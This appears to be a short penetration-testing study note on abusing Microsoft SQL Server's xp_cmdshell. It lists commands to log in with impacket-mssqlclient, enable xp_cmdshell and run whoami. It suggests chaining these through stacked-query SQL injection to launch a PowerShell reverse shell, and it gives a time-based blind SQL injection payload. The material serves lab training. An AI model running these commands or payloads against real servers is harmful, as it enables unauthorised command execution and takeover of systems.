
#### xp_cmdshell

In Microsoft SQL Server, the `xp_cmdshell` function takes a string and passes it to a command shell for execution. The function returns any output as rows of text. The function is disabled by default and, once enabled, it must be called with the EXECUTE keyword instead of SELECT.

e.g. utilizing xp_cmdshell to execute whoami command.

1. `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`
2. `EXECUTE  sp_configure 'show advanced options', 1;`
3. `RECONFIGURE;`
4. `EXECUTE sp_configure 'xp_cmdshell', 1;`
5. `RECONFIGURE;`
6. `EXECUTE xp_cmdshell 'whoami';`

```
if you find a vulnerability that allows stacked queries you can put all of the above into a single command line followed by -- //

you can then replace whoami with a powershell reverse shell base64 encoded from revshells
```

This can be used to upgrade out SQL shell to a more standard reverse shell.

#### blind payload

`test'; waitfor delay '0:0:5'-- //` - time delay test for mssql
